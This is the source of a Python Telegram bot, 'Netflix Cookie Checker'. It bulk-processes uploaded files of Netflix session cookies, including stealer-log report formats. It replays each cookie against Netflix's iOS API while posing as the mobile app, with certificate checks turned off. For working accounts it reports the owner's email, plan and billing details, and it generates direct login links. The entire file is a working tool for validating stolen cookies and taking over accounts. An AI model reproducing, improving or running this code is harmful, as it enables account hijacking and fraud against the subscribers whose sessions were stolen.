import asyncio
import io
import json
import logging
import os
import re
import urllib.parse
import zipfile
from datetime import datetime, timezone

import httpx
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from urllib3.exceptions import InsecureRequestWarning

# ── Config ─────────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
MAX_CONCURRENT = 10
MAX_COOKIES    = 5000

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

ACCOUNT_PARAMS = {
    **QUERY_PARAMS,
    "path": '["account","customer"]',
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS     = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)

# ── Helpers ────────────────────────────────────────────────────────────────────

def format_expiry(ts) -> str:
    if not isinstance(ts, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(ts)


def token_validity_label(expires) -> str:
    if not isinstance(expires, (int, float)):
        return "Unknown"
    delta = int(expires) - int(datetime.now(timezone.utc).timestamp())
    if delta <= 0:
        return "Expired"
    days, rem = divmod(delta, 86400)
    hours, rem = divmod(rem, 3600)
    minutes    = rem // 60
    if days > 0:
        return f"{days}d {hours}h {minutes}m remaining"
    if hours > 0:
        return f"{hours}h {minutes}m remaining"
    return f"{minutes}m remaining"


def is_expiring_today(ts) -> bool:
    if not isinstance(ts, (int, float)):
        return False
    now   = datetime.now(timezone.utc)
    start = int(now.replace(hour=0, minute=0, second=0, microsecond=0).timestamp())
    return start <= ts < start + 86400


def _decode_value(v: str) -> str:
    if "%" in v:
        try:
            return urllib.parse.unquote(v)
        except Exception:
            pass
    return v

# ── Cookie parsing ─────────────────────────────────────────────────────────────

def _parse_netscape_line(line: str) -> dict:
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}


def _extract_inline_cookie_string(line: str) -> str | None:
    """
    Handles lines like:
      🍪 Cookie: NetflixId=abc; SecureNetflixId=xyz
      Cookie: NetflixId=abc
      NetflixId=abc; ...
    Returns just the cookie string portion, or None.
    """
    # Strip emoji and label prefix: anything before "NetflixId=" or "Cookie:"
    m = re.search(r'(?:Cookie:\s*)?(NetflixId=.+)', line, re.IGNORECASE)
    if m:
        return m.group(1).strip()
    return None


def extract_cookie_dict(text: str) -> dict:
    out = {}

    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue

        # Netscape tab-delimited
        out.update(_parse_netscape_line(line))

        # Emoji/label prefixed cookie lines: "🍪 Cookie: NetflixId=..."
        cookie_str = _extract_inline_cookie_string(line)
        if cookie_str:
            for key in COOKIE_KEYS:
                if key in out:
                    continue
                m = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", cookie_str)
                if m:
                    out[key] = _decode_value(m.group(1))

    # JSON formats
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for c in data:
            n, v = c.get("name"), c.get("value")
            if n in COOKIE_KEYS and isinstance(v, str):
                out[n] = _decode_value(v)
    elif isinstance(data, dict):
        if any(k in data for k in COOKIE_KEYS):
            for k in COOKIE_KEYS:
                v = data.get(k)
                if isinstance(v, str):
                    out[k] = _decode_value(v)
        elif isinstance(data.get("cookies"), list):
            for c in data["cookies"]:
                n, v = c.get("name"), c.get("value")
                if n in COOKIE_KEYS and isinstance(v, str):
                    out[n] = _decode_value(v)

    # Fallback plain regex
    for key in COOKIE_KEYS:
        if key in out:
            continue
        m = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if m:
            out[key] = _decode_value(m.group(1))

    return out


def _split_cookie_blocks(text: str) -> list[str]:
    """
    Split bulk text into per-account blocks.
    Handles:
      - Emoji report format (blocks separated by 📁 Source: or ---)
      - Blank-line separated blocks
      - One entry per line
      - JSON array formats
    """
    text = text.strip()
    if not text:
        return []

    # JSON
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        blocks = []
        for item in data:
            if isinstance(item, list):
                blocks.append(json.dumps(item))
            elif isinstance(item, dict):
                if any(k in item for k in COOKIE_KEYS):
                    blocks.append(json.dumps(item))
                elif "name" in item and "value" in item:
                    blocks.append(json.dumps([item]))
        return blocks

    # Emoji report format — split on the separator line "---" or "📁 Source:"
    if "📁 Source:" in text or "\r\n---\r\n" in text or "\n---\n" in text:
        # Split on the source header line to get per-account chunks
        chunks = re.split(r'(?=📁 Source:)', text)
        if len(chunks) > 1:
            return [c.strip() for c in chunks if c.strip() and "NetflixId" in c]

    # Blank-line delimited
    sections = re.split(r"\n{2,}", text)
    if len(sections) > 1:
        return [s.strip() for s in sections if s.strip()]

    # One entry per line
    return [line.strip() for line in text.splitlines() if line.strip()]


def extract_all_cookies(text: str) -> list[dict]:
    seen, results = set(), []
    for block in _split_cookie_blocks(text):
        cd  = extract_cookie_dict(block)
        nid = cd.get(REQUIRED_COOKIE)
        if nid and nid not in seen:
            seen.add(nid)
            results.append(cd)
    return results[:MAX_COOKIES]


def _read_bytes(data: bytes) -> str:
    for enc in ("utf-8", "utf-8-sig", "latin-1"):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            continue
    return data.decode("utf-8", errors="replace")


def extract_cookies_from_file(filename: str, data: bytes) -> list[dict]:
    if filename.lower().endswith(".zip"):
        all_cookies, seen = [], set()
        try:
            with zipfile.ZipFile(io.BytesIO(data)) as zf:
                for member in zf.namelist():
                    mname = member.lower()
                    if mname.endswith((".txt", ".json", ".csv")) and not mname.startswith("__"):
                        text = _read_bytes(zf.read(member))
                        for cd in extract_all_cookies(text):
                            nid = cd.get(REQUIRED_COOKIE)
                            if nid and nid not in seen:
                                seen.add(nid)
                                all_cookies.append(cd)
        except zipfile.BadZipFile:
            pass
        return all_cookies[:MAX_COOKIES]

    return extract_all_cookies(_read_bytes(data))

# ── Netflix API ────────────────────────────────────────────────────────────────

async def fetch_token(nid: str, client: httpx.AsyncClient) -> tuple[str, int | None]:
    headers = {**BASE_HEADERS, "Cookie": f"NetflixId={nid}"}
    resp    = await client.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=20)
    resp.raise_for_status()
    data    = resp.json()

    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {})
        .get("default") or {}
    )
    token   = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("no token in response")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires


async def fetch_account(nid: str, client: httpx.AsyncClient) -> dict:
    empty   = {
        "email": "N/A", "membership": "N/A", "country": "N/A",
        "member_since": "N/A", "num_profiles": "N/A",
        "can_stream": "N/A", "max_streams": "N/A", "subscription_price": "N/A",
    }
    headers = {**BASE_HEADERS, "Cookie": f"NetflixId={nid}"}
    try:
        resp = await client.get(API_URL, params=ACCOUNT_PARAMS, headers=headers, timeout=20)
        resp.raise_for_status()
        raw  = resp.json()
        acct = ((raw.get("value") or {}).get("account") or {})
        cust = acct.get("customer") or {}
        if isinstance(cust, dict) and "primaryEmail" not in cust:
            cust = cust.get("customer") or cust

        def g(key, fallback="N/A"):
            v = cust.get(key)
            return str(v) if v not in (None, "", {}) else fallback

        streaming = cust.get("currentMembership") or cust.get("membership") or {}
        return {
            "email":              g("primaryEmail"),
            "membership":         g("membershipStatus"),
            "country":            g("countryOfSignup"),
            "member_since":       g("memberSince"),
            "num_profiles":       g("numProfiles"),
            "can_stream":         g("canStream"),
            "max_streams":        str(streaming.get("maxStreams", "N/A")),
            "subscription_price": str(streaming.get("billingMonthlyTotalPrice", "N/A")),
        }
    except Exception:
        return empty


async def check_one(cookie_dict: dict, client: httpx.AsyncClient, sem: asyncio.Semaphore) -> dict:
    nid = cookie_dict.get(REQUIRED_COOKIE, "?")
    async with sem:
        try:
            token, expires = await fetch_token(nid, client)
            account        = await fetch_account(nid, client)
            return {
                "status":         "live",
                "netflix_id":     nid,
                "token":          token,
                "expires":        expires,
                "expiring_today": is_expiring_today(expires),
                **account,
                "error":          None,
            }
        except httpx.HTTPStatusError as e:
            code   = e.response.status_code
            status = "dead" if code in (401, 403) else "error"
            return {
                "status": status, "netflix_id": nid, "token": None,
                "expires": None, "expiring_today": False,
                "email": "N/A", "membership": "N/A", "country": "N/A",
                "member_since": "N/A", "num_profiles": "N/A",
                "can_stream": "N/A", "max_streams": "N/A",
                "subscription_price": "N/A", "error": f"HTTP {code}",
            }
        except Exception as e:
            return {
                "status": "error", "netflix_id": nid, "token": None,
                "expires": None, "expiring_today": False,
                "email": "N/A", "membership": "N/A", "country": "N/A",
                "member_since": "N/A", "num_profiles": "N/A",
                "can_stream": "N/A", "max_streams": "N/A",
                "subscription_price": "N/A", "error": str(e)[:120],
            }

# ── Formatters ─────────────────────────────────────────────────────────────────

def account_card(r: dict, index: int | None = None) -> str:
    flag     = "⚠️ Expiring Today" if r["expiring_today"] else "✅ Active"
    validity = token_validity_label(r["expires"])
    header   = f"🎬 *Netflix Account*" + (f" #{index}" if index else "") + f" — {flag}"
    return "\n".join([
        header,
        "─" * 32,
        f"📧 *Email*          `{r['email']}`",
        f"💳 *Membership*     `{r['membership']}`",
        f"🌍 *Country*        `{r['country']}`",
        f"📅 *Member Since*   `{r['member_since']}`",
        f"👥 *Profiles*       `{r['num_profiles']}`",
        f"📺 *Can Stream*     `{r['can_stream']}`",
        f"🔀 *Max Streams*    `{r['max_streams']}`",
        f"💰 *Sub Price*      `{r['subscription_price']}`",
        "─" * 32,
        f"⏰ *Token Expires*  `{format_expiry(r['expires'])}`",
        f"⌛ *Link Valid For* `{validity}`",
        f"🔗 *Login URL*",
        f"`https://netflix.com/?nftoken={r['token']}`",
    ])


def build_output(results: list[dict]) -> str:
    live          = [r for r in results if r["status"] == "live"]
    live_safe     = [r for r in live    if not r["expiring_today"]]
    live_expiring = [r for r in live    if r["expiring_today"]]
    dead          = [r for r in results if r["status"] == "dead"]
    error         = [r for r in results if r["status"] == "error"]

    ts  = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    sep = "=" * 64
    L   = [
        f"Netflix Checker — {ts}",
        f"Total: {len(results)}  Live: {len(live)}  "
        f"Safe: {len(live_safe)}  Expiring Today: {len(live_expiring)}  "
        f"Dead: {len(dead)}  Error: {len(error)}",
        "",
    ]

    def add_block(r):
        L.extend([
            f"Email          : {r['email']}",
            f"Membership     : {r['membership']}",
            f"Country        : {r['country']}",
            f"Member Since   : {r['member_since']}",
            f"Profiles       : {r['num_profiles']}",
            f"Can Stream     : {r['can_stream']}",
            f"Max Streams    : {r['max_streams']}",
            f"Sub Price      : {r['subscription_price']}",
            f"Token Expires  : {format_expiry(r['expires'])}",
            f"Link Valid For : {token_validity_label(r['expires'])}",
            f"Login URL      : https://netflix.com/?nftoken={r['token']}",
            f"NetflixId      : {r['netflix_id']}",
            "",
        ])

    L += [sep, "LIVE — NOT EXPIRING TODAY", sep]
    for r in live_safe:
        add_block(r)

    if live_expiring:
        L += [sep, "LIVE — EXPIRING TODAY", sep]
        for r in live_expiring:
            add_block(r)

    L += [sep, "DEAD", sep]
    for r in dead:
        L.append(r["netflix_id"])
    L.append("")

    L += [sep, "ERRORS", sep]
    for r in error:
        L.append(f"{r['netflix_id']}  —  {r['error']}")
    L.append("")

    return "\n".join(L)

# ── Progress tracker ───────────────────────────────────────────────────────────

class ProgressReporter:
    def __init__(self, message, total: int):
        self.message    = message
        self.total      = total
        self.done       = 0
        self.live       = 0
        self._lock      = asyncio.Lock()
        self._last_edit = 0.0

    async def tick(self, result: dict):
        async with self._lock:
            self.done += 1
            if result.get("status") == "live":
                self.live += 1
            now = asyncio.get_event_loop().time()
            if now - self._last_edit >= 3.0 or self.done == self.total:
                pct = int(self.done / self.total * 100)
                bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
                try:
                    await self.message.edit_text(
                        f"⏳ Checking…\n"
                        f"[{bar}] {pct}%\n"
                        f"{self.done}/{self.total}  —  ✅ {self.live} live"
                    )
                    self._last_edit = now
                except Exception:
                    pass

# ── Keyboards ──────────────────────────────────────────────────────────────────

def main_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("ℹ️ Help",    callback_data="help"),
        InlineKeyboardButton("📊 Status", callback_data="status"),
    ]])


def back_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🔙 Menu", callback_data="menu"),
    ]])

# ── Bot handlers ───────────────────────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎬 *Netflix Cookie Checker*\n\n"
        "Send a `.txt`, `.json`, or `.zip` cookie file to bulk check.\n"
        "Or paste a single cookie string as text.\n\n"
        "Supported formats:\n"
        "• `NetflixId=abc; SecureNetflixId=xyz`\n"
        "• Emoji report format (`🍪 Cookie: NetflixId=...`)\n"
        "• Netscape tab-delimited\n"
        "• JSON array `[{name, value}]`",
        parse_mode="Markdown",
        reply_markup=main_menu_kb(),
    )


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    if q.data == "menu":
        await q.edit_message_text(
            "🎬 *Netflix Cookie Checker*\n\nSend a file or paste a cookie.",
            parse_mode="Markdown",
            reply_markup=main_menu_kb(),
        )
    elif q.data == "help":
        await q.edit_message_text(
            "📖 *Help*\n\n"
            "• Send `.txt` / `.json` / `.zip` for bulk checking\n"
            "• Paste a single cookie string for one-off checks\n"
            "• Emoji report files (`🍪 Cookie:` format) supported\n"
            f"• Max {MAX_COOKIES} cookies per batch\n"
            f"• {MAX_CONCURRENT} concurrent checks\n\n"
            "Each live account shows:\n"
            "email · membership · country · member since\n"
            "profiles · streaming limits · sub price\n"
            "token expiry · link validity · login URL",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )
    elif q.data == "status":
        await q.edit_message_text(
            "⚙️ *Status*\n\n"
            f"• Max cookies : `{MAX_COOKIES}`\n"
            f"• Concurrency : `{MAX_CONCURRENT}`\n"
            f"• UTC time    : `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}`",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc      = update.message.document
    filename = doc.file_name or "cookies.txt"

    status_msg = await update.message.reply_text("📥 Downloading…")

    buf = io.BytesIO()
    tg_file = await context.bot.get_file(doc.file_id)
    await tg_file.download_to_memory(buf)

    cookies = extract_cookies_from_file(filename, buf.getvalue())
    if not cookies:
        await status_msg.edit_text(
            "❌ No valid cookies found.\n"
            "File must contain `NetflixId=` entries.",
            reply_markup=main_menu_kb(),
        )
        return

    await status_msg.edit_text(f"🔍 Found {len(cookies)} cookies. Checking…")

    sem      = asyncio.Semaphore(MAX_CONCURRENT)
    reporter = ProgressReporter(status_msg, len(cookies))

    async with httpx.AsyncClient(verify=False) as client:
        tasks   = [check_one(cd, client, sem) for cd in cookies]
        results = []
        for coro in asyncio.as_completed(tasks):
            r = await coro
            results.append(r)
            await reporter.tick(r)

    results.sort(key=lambda r: (
        {"live": 0, "dead": 1, "error": 2}[r["status"]],
        1 if r.get("expiring_today") else 0,
    ))

    live          = [r for r in results if r["status"] == "live"]
    live_safe     = [r for r in live    if not r["expiring_today"]]
    live_expiring = [r for r in live    if r["expiring_today"]]
    dead_count    = sum(1 for r in results if r["status"] == "dead")
    error_count   = sum(1 for r in results if r["status"] == "error")

    first = next((r for r in live if not r["expiring_today"]), live[0] if live else None)
    if first:
        await update.message.reply_text(account_card(first), parse_mode="Markdown")

    await status_msg.edit_text(
        f"📊 *Done*\n\n"
        f"Total          : `{len(results)}`\n"
        f"✅ Live         : `{len(live)}`\n"
        f"   ↳ Safe       : `{len(live_safe)}`\n"
        f"   ↳ Exp. Today : `{len(live_expiring)}`\n"
        f"❌ Dead         : `{dead_count}`\n"
        f"⚠️ Error        : `{error_count}`",
        parse_mode="Markdown",
    )

    out_buf      = io.BytesIO(build_output(results).encode("utf-8"))
    out_buf.name = f"results_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"
    await update.message.reply_document(
        document=out_buf,
        filename=out_buf.name,
        caption="Safe accounts at top · expiring today separated.",
    )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    if not text:
        return

    cd = extract_cookie_dict(text)
    if not cd.get(REQUIRED_COOKIE):
        await update.message.reply_text(
            "No `NetflixId` found.\nTo check many at once, send a file.",
            reply_markup=main_menu_kb(),
        )
        return

    msg = await update.message.reply_text("🔍 Checking…")
    sem = asyncio.Semaphore(1)

    async with httpx.AsyncClient(verify=False) as client:
        result = await check_one(cd, client, sem)

    if result["status"] == "live":
        await msg.edit_text(account_card(result), parse_mode="Markdown")
    elif result["status"] == "dead":
        await msg.edit_text("❌ *Dead* — cookie invalid or expired.", parse_mode="Markdown")
    else:
        await msg.edit_text(f"⚠️ *Error* — `{result['error']}`", parse_mode="Markdown")


# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    log.info("Bot running.")
    app.run_polling()


if __name__ == "__main__":
    main()
